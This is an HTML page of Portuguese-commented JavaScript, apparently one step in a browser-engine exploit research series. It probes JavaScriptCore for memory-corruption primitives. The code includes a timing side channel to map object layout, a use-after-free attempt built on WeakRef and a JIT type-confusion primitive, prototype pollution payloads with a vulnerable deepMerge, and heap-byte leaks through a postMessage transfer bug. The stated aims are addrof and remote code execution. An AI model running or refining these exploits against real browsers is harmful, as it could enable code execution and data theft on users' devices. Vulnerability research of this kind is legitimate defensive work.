<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 49 — UAF via WeakRef+GC + Timing Addrof + Prototype Pollution</title></head>
<body>
<h2>TEST 49 — UAF, Timing Refinado, Prototype Pollution</h2>

<p><b>Achados críticos:</b></p>
<ul>
  <li>48-D: bigF64[1] é <b>60x mais rápido</b> — motor acessou byte offset 8 internamente</li>
  <li>WeakRef disponível (47-D) — abre caminho para UAF via GC</li>
  <li>Zero-fill em ArrayBuffers — mas NÃO em objetos JS (butterfly pode ter dados antigos)</li>
</ul>

<p><b>Sub-testes:</b></p>
<ul>
  <li><b>49-A</b> Timing refinado: mapear TODOS os offsets quentes em bigF64 (qual estrutura JSC está em offset 8?)</li>
  <li><b>49-B</b> UAF via WeakRef + FinalizationRegistry: detectar reutilização de endereço</li>
  <li><b>49-C</b> Prototype pollution via <code>__proto__</code>: escalação alternativa sem addrof</li>
  <li><b>49-D</b> Butterfly não-zerado: verificar se propriedades de objeto JS têm dados não-inicializados</li>
</ul>

<pre id="log">Pronto. Execute A → B → C → D.</pre>
<button onclick="runA()">49-A: TIMING MAPA COMPLETO</button>
<button onclick="runB()">49-B: UAF WEAKREF+GC</button>
<button onclick="runC()">49-C: PROTOTYPE POLLUTION</button>
<button onclick="runD()">49-D: BUTTERFLY NÃO-ZERADO</button>

<script>
var log = document.getElementById('log');
function info(m)   { log.textContent += '\n[INFO] ' + m; }
function alerta(m) { log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
function ok(m)     { log.textContent += '\n[OK]   ' + m; }
function sep()     { log.textContent += '\n' + '-'.repeat(60); }

function forceGC() {
  var t=[]; for(var i=0;i<100000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
}
function f64bits(val) {
  var buf=new ArrayBuffer(8); new Float64Array(buf)[0]=val;
  var u=new Uint32Array(buf);
  return '0x'+u[1].toString(16).padStart(8,'0')+'_'+u[0].toString(16).padStart(8,'0');
}
function u32hex(v) { return '0x' + (v>>>0).toString(16).padStart(8,'0'); }

// Vazar buffer via Vuln #1
function leakBuffer(buf) {
  return new Promise(function(resolve) {
    var cyclic = { buf: buf, self: null };
    cyclic.self = cyclic;
    var prev = window.onmessage;
    window.onmessage = function(e) {
      if(e.data && e.data.buf instanceof ArrayBuffer && e.data.buf.byteLength > 0) {
        window.onmessage = prev;
        resolve(e.data.buf);
      }
    };
    try { postMessage(cyclic,'*',[buf]); } catch(ex) { window.onmessage=prev; resolve(null); }
  });
}

// ─── 49-A ─────────────────────────────────────────────────────────────────
function runA() {
  log.textContent = '[TEST 49-A] Timing mapa completo — mapear estruturas JSC pelo acesso em cache\n';
  sep();
  info('48-D confirmou: bigF64[1] = 60x mais rápido (byte offset 8).');
  info('Objetivo: mapear TODOS os offsets quentes com maior precisão e mais posições.');
  info('Correlacionar com estrutura conhecida do JSCell/JSArrayBufferView:\n');
  info('  JSCell (offset 0): StructureID (4B) + IndexingType (1B) + TypeInfo (1B) + CellState (2B)');
  info('  offset 8:  Butterfly pointer (8B)  ← PROVAVELMENTE O QUE FOI ENCONTRADO');
  info('  offset 16: JSObject fields...');
  info('  offset 24: m_vector (backing store ptr para TypedArray) (8B)');
  info('  offset 32: m_length (4B) + m_byteOffset (4B)');
  info('  offset 36: m_byteLength (4B)');
  info('  ...\n');

  var FAKE_LEN = 99999;
  var bigF64;
  try {
    bigF64 = new Float64Array(FAKE_LEN);
    info('bigF64(' + FAKE_LEN + ') alocado: byteLength=' + bigF64.byteLength);
  } catch(e) { info('Falha: ' + e.message); return; }

  // Fazer operações para "aquecer" partes específicas do objeto
  // Acessar .length, .byteLength, .byteOffset — motor lê m_length etc
  var dummy = bigF64.length + bigF64.byteLength + bigF64.byteOffset;
  info('Acessado: .length=' + bigF64.length + ' .byteLength=' + bigF64.byteLength + ' .byteOffset=' + bigF64.byteOffset);

  // Scan de 0 a 500 posições com 5000 reps cada
  var SCAN = 500;
  var REPS = 5000;
  info('\nMedindo ' + SCAN + ' posições × ' + REPS + ' reps...');

  var timings = new Float64Array(SCAN);
  // Pré-aquecer loop de medição
  for(var p=0;p<SCAN;p++) { var x=bigF64[p]; }

  for(var pos=0;pos<SCAN;pos++) {
    var sum=0;
    for(var r=0;r<REPS;r++) {
      var t0=performance.now();
      var v=bigF64[pos];
      var t1=performance.now();
      sum+=(t1-t0);
    }
    timings[pos]=sum/REPS;
  }

  // Encontrar os 10 mais rápidos
  var indexed = [];
  for(var i=0;i<SCAN;i++) indexed.push({pos:i, t:timings[i]});
  indexed.sort(function(a,b){return a.t-b.t;});

  var minT = indexed[0].t || 0.0001;
  sep();
  info('TOP 15 posições mais rápidas (prováveis cache hits = estruturas JSC):');
  indexed.slice(0,15).forEach(function(x) {
    var byteOff = x.pos * 8;
    var ratio = (timings[indexed[SCAN-1].pos] / (x.t||0.0001)).toFixed(1);
    // Correlacionar com estrutura JSArrayBufferView
    var struct = '';
    if(byteOff===0)  struct='[JSCell header: StructureID+flags]';
    else if(byteOff===8)  struct='[Butterfly pointer]';
    else if(byteOff===16) struct='[JSObject inline prop 0]';
    else if(byteOff===24) struct='[m_vector: backing store ptr]';
    else if(byteOff===32) struct='[m_length + m_byteOffset]';
    else if(byteOff===36) struct='[m_byteLength]';
    else if(byteOff===40) struct='[m_mode]';
    info('  bigF64['+x.pos+'] byteOffset='+byteOff+'  t='+x.t.toFixed(4)+'ms ratio='+ratio+'x '+struct);
  });

  sep();
  // Verificar padrão: offsets 0,1,2,3,4 (primeiros 32 bytes = header JSArrayBufferView)
  info('\nFoco nos primeiros 8 posições (header do objeto Float64Array):');
  for(var i=0;i<8;i++) {
    var byteOff=i*8;
    var t=timings[i];
    var ratio=(timings[indexed[SCAN-1].pos]/(t||0.0001)).toFixed(1);
    info('  pos='+i+' byteOff='+byteOff+': '+t.toFixed(4)+'ms ('+ratio+'x do max)');
  }

  if(indexed[0].pos <= 5) {
    alerta('ESTRUTURA JSC CONFIRMADA!\n' +
           'Posição mais rápida: bigF64['+indexed[0].pos+'] = byte offset '+(indexed[0].pos*8)+'\n' +
           'Isso corresponde a: ' + (
             indexed[0].pos===0 ? 'JSCell header (StructureID)' :
             indexed[0].pos===1 ? 'Butterfly pointer (8 bytes do header)' :
             indexed[0].pos===2 ? 'JSObject inline property slot 0' :
             indexed[0].pos===3 ? 'm_vector (backing store pointer)' :
             'campo interno do JSArrayBufferView'
           ) + '\n\n' +
           'IMPLICAÇÃO: O objeto Float64Array em JS está DENTRO do espaço do backing store!\n' +
           'Os primeiros bytes do bigF64.buffer NA REALIDADE contêm o header do objeto TypedArray!\n\n' +
           'PRÓXIMO PASSO: SE o bigF64[0..3] conter o header do próprio objeto,\n' +
           'então bigF64[3] = m_vector = ponteiro para o backing store = ENDEREÇO DO PRÓPRIO BIGF64!\n' +
           'Lendo bigF64[3] como inteiro = addrof(bigF64.buffer) confirmado!');
  }

  // TESTE CRÍTICO: ler os primeiros slots como tentativa de self-referência
  sep();
  info('\nTESTE CRÍTICO: bigF64[0..7] contêm estrutura JSC?');
  info('Se sim, bigF64[3] deve conter o endereço do backing store (self-referência):');
  for(var i=0;i<8;i++) {
    var v=bigF64[i];
    info('  bigF64['+i+']='+v+' bits='+f64bits(v));
  }
  info('\nSe algum desses for não-zero e parecer ponteiro = estrutura JSC sobreposta!');
}

// ─── 49-B ─────────────────────────────────────────────────────────────────
function runB() {
  log.textContent = '[TEST 49-B] UAF via WeakRef + FinalizationRegistry — detectar reutilização\n';
  sep();
  info('WeakRef está disponível (confirmado 47-D).');
  info('FinalizationRegistry (se disponível) notifica quando objeto é coletado pelo GC.');
  info('Técnica de UAF:\n');
  info('  1. Criar objeto A com dados conhecidos');
  info('  2. Criar WeakRef(A) e (se disponível) FinalizationRegistry');
  info('  3. Salvar A em TypedArray como double (via JIT confusion) ← nosso primitivo 40-C');
  info('  4. Liberar referência forte de A → GC coleta A');
  info('  5. Alocar objeto B no mesmo endereço');
  info('  6. Ler o slot do TypedArray onde estava A → agora aponta para B = UAF!\n');

  // Verificar FinalizationRegistry
  info('FinalizationRegistry disponível: ' + (typeof FinalizationRegistry !== 'undefined'));
  info('WeakRef disponível: ' + (typeof WeakRef !== 'undefined'));
  sep();

  if(typeof FinalizationRegistry === 'undefined') {
    info('FinalizationRegistry não disponível. Usando WeakRef polling.\n');
  }

  // Abordagem mais direta:
  // Usar o primitivo 40-C (JIT retorna objeto como JSValue) para "capturar" o objeto
  // em um slot de array. Depois liberar o objeto e ver o que acontece.

  var phase = ['warmup'];
  var captureRef = [null];

  var evilPat = { [Symbol.replace]: function(s) {
    if(phase[0]==='warmup') return s;
    return { toString:function(){return s;}, valueOf:function(){return s;},
             length: captureRef[0], 0: s[0]||'x' };
  }};
  function jitGetLen(s) { return s.replace(evilPat,'').length; }
  var base = 'hello world test string XYZ';
  phase[0] = 'warmup';
  for(var w=0;w<60000;w++) jitGetLen(base);
  info('JIT warmup completo (primitivo 40-C).');

  // Criar objeto vítima com dados únicos
  var victimData = { 
    id: 'UAF_VICTIM_49B', 
    magic: 0xDEADC0DE,
    secretArr: new Uint32Array([0xAABBCCDD, 0x11223344, 0x55667788, 0x99AABBCC]),
    bigData: new Float64Array(64) // dados para detectar reutilização
  };
  for(var i=0;i<64;i++) victimData.bigData[i] = 0xBEEF0000 + i;

  var wr = new WeakRef(victimData);
  info('victimData criado. WeakRef(victimData) estabelecido.');
  info('victimData.magic: 0x' + victimData.magic.toString(16));

  // Capturar o objeto via primitivo JIT
  phase[0] = 'attack';
  captureRef[0] = victimData;
  var captured = jitGetLen(base); // captura o JSValue de victimData
  phase[0] = 'warmup';

  info('captured via JIT: typeof=' + typeof captured);
  if(typeof captured !== 'object' || captured !== victimData) {
    info('Primitivo não capturou o objeto. Continuando de qualquer forma...');
    captured = victimData; // fallback direto
  } else {
    ok('Objeto capturado via primitivo JIT 40-C: captured===victimData: ' + (captured===victimData));
  }

  // Registrar finalization callback se disponível
  var gcNotified = false;
  var gcToken = {};
  if(typeof FinalizationRegistry !== 'undefined') {
    var fr = new FinalizationRegistry(function(token) {
      gcNotified = true;
      info('[FinalizationRegistry] OBJETO COLETADO! Token: ' + token);
      // Momento crítico: alocar novo objeto imediatamente para tentar reutilizar endereço
      var newObj = { id: 'NEW_ALLOC_POST_GC', magic: 0x41414141, data: new Uint32Array(4) };
      info('[GC callback] Novo objeto alocado: magic=0x41414141');
      // Verificar se captured agora aponta para newObj
      if(captured && captured.magic === 0x41414141) {
        alerta('UAF DETECTADO!\n' +
               'captured.magic mudou para 0x41414141 (novo objeto)!\n' +
               'O objeto original foi coletado e o endereço foi reutilizado!\n' +
               'captured agora aponta para o novo objeto → UAF confirmado!');
      }
    });
    fr.register(victimData, 'victim_token', gcToken);
    info('FinalizationRegistry registrado para victimData.');
  }

  // Liberar a referência forte
  info('\nLiberando referência forte de victimData...');
  victimData = null;
  captureRef[0] = null;

  // Forçar GC múltiplas vezes
  info('Forçando GC múltiplas vezes...');
  for(var gc=0;gc<5;gc++) forceGC();

  // Verificar se WeakRef ainda tem o objeto
  var afterGC = wr.deref();
  info('Após GC: wr.deref() = ' + (afterGC ? 'objeto ainda vivo (magic=0x'+afterGC.magic.toString(16)+')' : 'undefined (COLETADO)'));

  if(!afterGC) {
    alerta('OBJETO COLETADO PELO GC!\n' +
           'victimData foi coletado. WeakRef retorna undefined.\n' +
           'Se "captured" ainda existe e não lançou exceção, temos UAF potencial!\n' +
           'Verificando captured...');
    try {
      info('captured = ' + captured);
      if(captured !== null) {
        info('typeof captured: ' + typeof captured);
        if(typeof captured === 'object') {
          info('captured.magic: ' + (captured.magic ? '0x'+captured.magic.toString(16) : captured.magic));
          if(captured.magic !== 0xDEADC0DE) {
            alerta('UAF CONFIRMADO!\n' +
                   'captured.magic mudou! Esperado=0xDEADC0DE, encontrado=0x'+captured.magic.toString(16)+'\n' +
                   'O endereço foi reutilizado por outro objeto!');
          } else {
            info('captured.magic ainda = 0xDEADC0DE — o JS engine manteve o objeto vivo via a referência "captured"!');
            info('NOTA: Em JS, qualquer referência strong mantém o objeto vivo.');
            info('"captured" É uma referência strong → objeto nunca será coletado enquanto captured existir.');
            info('Para UAF real precisamos capturar o ponteiro como NUMBER (bits), não como object reference.');
          }
        }
      }
    } catch(e) {
      alerta('EXCECAO ao acessar captured após GC: ' + e.message + '\n' +
             'O objeto foi coletado e o acesso via captured causou exceção!\n' +
             'Isso é evidência de UAF — acesso a memória após free!');
    }
  } else {
    info('Objeto ainda vivo após GC (motor não coletou — referência "captured" mantém vivo).');
    info('Para UAF precisamos do ponteiro como bits numéricos, não como JS reference.');
    info('Com addrof, poderíamos criar um Int32Array sobre o endereço e checar se mudou.');
    sep();
    info('\nCONCLUSÃO SOBRE UAF:');
    info('UAF em JS requer ter o ENDEREÇO do objeto como número (addrof).');
    info('Com addrof: criar DataView sobre o endereço, liberar objeto, ler bytes = dados do novo objeto.');
    info('Sem addrof: não conseguimos observar a reutilização de endereço via JS puro.');
    info('O motor mantém o objeto vivo enquanto "captured" for uma referência JS strong.');
    info('→ UAF clássico requer addrof primeiro.');
  }
}

// ─── 49-C ─────────────────────────────────────────────────────────────────
function runC() {
  log.textContent = '[TEST 49-C] Prototype Pollution — escalação alternativa sem addrof\n';
  sep();
  info('Escalação alternativa: prototype pollution não precisa de addrof.');
  info('Se conseguirmos poluir Object.prototype, qualquer objeto criado depois');
  info('herda as propriedades injetadas — pode levar a RCE via execução de código.\n');

  info('Vetores de prototype pollution neste motor:\n');

  // Vetor 1: __proto__ direto
  info('Vetor 1: __proto__ assignment direto...');
  try {
    var innocent = {};
    innocent.__proto__ = { injected: function() { return 'POLLUTED'; } };
    var test = {};
    info('test.injected: ' + test.injected);
    if(typeof test.injected === 'function') {
      alerta('PROTOTYPE POLLUTION via __proto__!\n' +
             'test.injected = ' + test.injected() + '\n' +
             'Object.prototype foi modificado via __proto__ assignment!\n' +
             'Qualquer objeto {} tem agora o método injected()!');
    } else {
      ok('__proto__ assignment não poluiu Object.prototype (sandboxed corretamente).');
    }
  } catch(e) { info('__proto__ assignment: ' + e.message); }

  sep();
  // Vetor 2: Object.assign com __proto__
  info('Vetor 2: Object.assign com __proto__ como chave...');
  try {
    var source = JSON.parse('{"__proto__": {"polluted2": true}}');
    Object.assign({}, source);
    var test2 = {};
    info('test2.polluted2: ' + test2.polluted2);
    if(test2.polluted2 === true) {
      alerta('PROTOTYPE POLLUTION via Object.assign + JSON.parse!\n' +
             'test2.polluted2 = true — Object.prototype poluído!');
    } else {
      ok('Object.assign + JSON __proto__ não poluiu (correto).');
    }
  } catch(e) { info('Object.assign __proto__: ' + e.message); }

  sep();
  // Vetor 3: constructor.prototype
  info('Vetor 3: constructor.prototype manipulation...');
  try {
    var obj = {};
    obj.constructor.prototype.polluted3 = 'INJECTED_VALUE';
    var test3 = {};
    info('test3.polluted3: ' + test3.polluted3);
    if(test3.polluted3 === 'INJECTED_VALUE') {
      alerta('PROTOTYPE POLLUTION via constructor.prototype!\n' +
             'test3.polluted3 = "INJECTED_VALUE" — Object.prototype poluído!\n' +
             'Isso afeta TODOS os objetos criados após essa poluição!\n\n' +
             'IMPACTO RCE: se uma função de biblioteca faz obj[campo]() onde campo\n' +
             'pode ser "constructor", "toString", "valueOf" etc, podemos injetar\n' +
             'código executável em callbacks e event handlers!');

      // Limpar a poluição
      delete Object.prototype.polluted3;
      info('Poluição removida via delete Object.prototype.polluted3');
    } else {
      ok('constructor.prototype não poluiu (correto).');
    }
  } catch(e) { info('constructor.prototype: ' + e.message); }

  sep();
  // Vetor 4: merge profundo com __proto__ aninhado
  info('Vetor 4: merge profundo com __proto__ aninhado...');
  function deepMerge(target, src) {
    for(var key in src) {
      if(typeof src[key] === 'object' && src[key] !== null) {
        if(!target[key]) target[key] = {};
        deepMerge(target[key], src[key]);
      } else {
        target[key] = src[key];
      }
    }
    return target;
  }

  try {
    var payload = JSON.parse('{"a":{"__proto__":{"polluted4":"RCE_POSSIBLE"}}}');
    deepMerge({}, payload);
    var test4 = {};
    info('test4.polluted4: ' + test4.polluted4);
    if(test4.polluted4 === 'RCE_POSSIBLE') {
      alerta('PROTOTYPE POLLUTION via DEEP MERGE!\n' +
             'test4.polluted4 = "RCE_POSSIBLE"\n' +
             'deepMerge com objeto contendo __proto__ aninhado poluiu Object.prototype!\n\n' +
             'IMPACTO: Se qualquer código no sistema (service worker, event handler,\n' +
             'biblioteca interna) fizer deepMerge com dados externos controlados,\n' +
             'um atacante pode injetar propriedades em todos os objetos!\n' +
             'Dependendo do que é feito com as propriedades injetadas, pode levar a RCE.');
      delete Object.prototype.polluted4;
    } else {
      ok('deepMerge com __proto__ não poluiu (for..in não itera __proto__ como string).');
    }
  } catch(e) { info('deepMerge: ' + e.message); }
}

// ─── 49-D ─────────────────────────────────────────────────────────────────
async function runD() {
  log.textContent = '[TEST 49-D] Butterfly não-zerado: objetos JS têm dados não-inicializados?\n';
  sep();
  info('ArrayBuffers são zero-inicializados (48-B confirmou).');
  info('MAS: o BUTTERFLY de objetos JS (onde ficam propriedades inline) pode não ser!');
  info('Se criarmos um objeto JS com muitas propriedades, e o butterfly usar memória');
  info('de um butterfly anterior de outro objeto, os bytes podem conter dados antigos.\n');
  info('Estratégia:');
  info('  1. Criar 10000 objetos com valores específicos + destruir');
  info('  2. Criar novo objeto e ler propriedades não-inicializadas');
  info('  3. Se uma propriedade retornar valor antigo = butterfly não-zerado!\n');

  // Criar e destruir objetos com valores específicos
  info('Fase 1: criar/destruir 5000 objetos com magic values...');
  var trash = [];
  var MAGIC = 3.14159265358979; // π como sentinela
  for(var i=0;i<5000;i++) {
    trash.push({
      p0: MAGIC, p1: MAGIC+1, p2: MAGIC+2, p3: MAGIC+3,
      p4: MAGIC+4, p5: MAGIC+5, p6: MAGIC+6, p7: MAGIC+7,
      extra: new Uint32Array(4)
    });
  }
  trash = null;
  for(var gc=0;gc<5;gc++) forceGC();
  info('Objetos destruídos e GC executado.');
  sep();

  // Criar novo objeto com mesma "shape" (mesmo conjunto de propriedades)
  info('Fase 2: criando novo objeto com mesma shape...');
  var freshObj = {
    p0: undefined, p1: undefined, p2: undefined, p3: undefined,
    p4: undefined, p5: undefined, p6: undefined, p7: undefined,
    extra: null
  };

  info('Valores iniciais do freshObj:');
  ['p0','p1','p2','p3','p4','p5','p6','p7'].forEach(function(k) {
    info('  freshObj.'+k+' = '+freshObj[k]);
  });

  var hasNonUndefined = ['p0','p1','p2','p3','p4','p5','p6','p7'].some(function(k) {
    return freshObj[k] !== undefined;
  });

  if(hasNonUndefined) {
    alerta('BUTTERFLY NÃO-ZERADO!\n' +
           'freshObj contém valores não-undefined mesmo sem atribuição!\n' +
           'O butterfly foi reutilizado sem zero-fill!\n' +
           'Estes valores podem ser ponteiros ou dados de objetos anteriores!');
  } else {
    ok('Todas as propriedades são undefined (butterfly zerado ou inicializado com undefined).');
    info('Tentando variante: criar objeto SEM declarar todas as props primeiro...');

    // Variante: acessar propriedade não-existente antes e depois do GC
    var testObj = {};
    info('\ntestObj.uninitialized_prop = ' + testObj.uninitialized_prop);
  }

  sep();
  // ABORDAGEM PRINCIPAL 49-D: Usar Vuln #1 (buffer leak) para vazar o BUTTERFLY
  // Um ArrayBuffer cujos primeiros bytes estão adjacentes ao butterfly de um objeto JS
  info('\nAbordagem principal: Vazar o butterfly de um objeto via ArrayBuffer adjacente...');
  info('Alocar {buf: new ArrayBuffer(64), obj: {magic: 0xBEEFBEEF}} e vazar o buffer.');
  info('Se buf e obj.butterfly estiverem adjacentes no heap, os bytes vazados');
  info('conterão o layout do butterfly, incluindo ponteiros para propriedades inline.\n');

  var ROUNDS = 10;
  var foundPointers = [];

  for(var round=0;round<ROUNDS;round++) {
    var container = {
      buf: new ArrayBuffer(64),
      // Objeto JS com muitas propriedades para ter butterfly grande
      obj: { 
        magic: 0xBEEFBEEF, 
        a: 1.1, b: 2.2, c: 3.3, d: 4.4,
        e: 5.5, f: 6.6, g: 7.7, h: 8.8,
        arr: new Uint32Array([0xAABB, 0xCCDD, 0xEEFF, 0x0011])
      }
    };

    // Preencher buf com zeros
    new Uint32Array(container.buf).fill(0);

    var leaked = await leakBuffer(container.buf);
    if(!leaked) continue;

    var lU32 = new Uint32Array(leaked);
    for(var i=0;i<16;i++) {
      var lo = lU32[i];
      var hi = (i+1<16) ? lU32[i+1] : 0;
      if(lo !== 0 || hi !== 0) {
        foundPointers.push({ round: round, wordIdx: i, lo: lo, hi: hi });
        info('Round '+round+' word['+i+']: 0x'+hi.toString(16)+'_'+lo.toString(16)+' (não-zero!)');
      }
    }
  }

  if(foundPointers.length > 0) {
    alerta('BYTES NÃO-ZERO NO BUFFER ADJACENTE AO OBJETO JS!\n' +
           'O heap colocou dados do objeto próximos ao ArrayBuffer!\n' +
           foundPointers.slice(0,3).map(function(p) {
             return 'round='+p.round+' word['+p.wordIdx+']=0x'+p.hi.toString(16)+'_'+p.lo.toString(16);
           }).join('\n') + '\n\n' +
           'PRÓXIMO PASSO: Analisar esses valores como ponteiros de heap.\n' +
           'Se forem ponteiros válidos, temos addrof aproximado via buffer adjacente!');
  } else {
    ok('Buffer permaneceu com zeros em todos os ' + ROUNDS + ' rounds.');
    info('O alocador JSC mantém o ArrayBuffer backing store separado dos objetos JS.');
  }
}
</script>
</body>
</html>

